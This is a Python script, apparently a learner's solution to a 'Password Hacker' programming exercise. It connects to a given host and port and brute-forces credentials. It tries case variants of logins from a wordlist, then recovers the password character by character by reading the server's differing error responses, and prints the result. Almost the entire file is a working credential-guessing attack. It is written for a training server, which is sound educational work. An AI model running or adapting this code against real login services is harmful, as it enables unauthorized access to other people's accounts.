import socket
import sys
import logging
import itertools
import json

logging.basicConfig(level=logging.DEBUG, filename='log.log')


# def password_generator():
#     chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
#     i = 1
#     while True:
#         password = itertools.product(chars, repeat=i)
#         i += 1
#         for elem in password:
#             yield ''.join(elem)

def password_letter_generator():
    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    while True:
        for char in chars:
            yield char


# def read_password_file():
#     with open(
#             'C:\\Users\\Amanda\\Google Drive\\python\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt') as f:
#         word = f.readline().strip('\n')
#         while word:
#             password = itertools.product(*([char.upper(), char.lower()] for char in word))
#             for elem in password:
#                 yield ''.join(elem)
#             word = f.readline().strip("\n")
#             logging.debug(f'new line {word}')


def read_login_file():
    with open(
            'C:\\Users\\Amanda\\Google Drive\\python\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt') as f:
        word = f.readline().strip('\n')
        while word:
            password = itertools.product(*([char.upper(), char.lower()] for char in word))
            for elem in password:
                yield ''.join(elem)
            word = f.readline().strip("\n")
            logging.debug(f'new line {word}')


def get_json_login(login, password):
    return json.dumps({"login": login, "password": password})


def main():
    args = sys.argv
    with socket.socket() as client_socket:
        hostname = args[1]
        port = int(args[2])
        address = (hostname, port)
        client_socket.connect(address)

        login_generator = read_login_file()
        login = next(login_generator)
        logging.debug(login)
        password_letter = '0'
        password = []
        password_generator = password_letter_generator()
        client_socket.send(get_json_login(login, password).encode())
        response = client_socket.recv(1024).decode()
        response_message = json.loads(response)["result"]

        while True:
            if response_message == "Connection success!":
                password.append(password_letter)
                break
            if response_message == "Wrong login!":
                login = next(login_generator)
                logging.debug(f'login: {login}')
            if response_message == "Wrong password!":
                password_letter = next(password_generator)
                logging.debug(f'password_letter: {password_letter}')
            if response_message == "Exception happened during login":
                password.append(password_letter)
                password_generator = password_letter_generator()
                logging.debug(f'password_generator: {password_generator}')
                password_letter = next(password_generator)
                logging.debug(f'password_letter: {password_letter}')
            test_password = ''.join([*password, password_letter])
            client_socket.send(get_json_login(login, test_password).encode())
            response = client_socket.recv(1024).decode()
            response_message = json.loads(response)["result"]

            logging.debug(response_message + ' ' + test_password)

        print(get_json_login(login, ''.join(password)))

main()


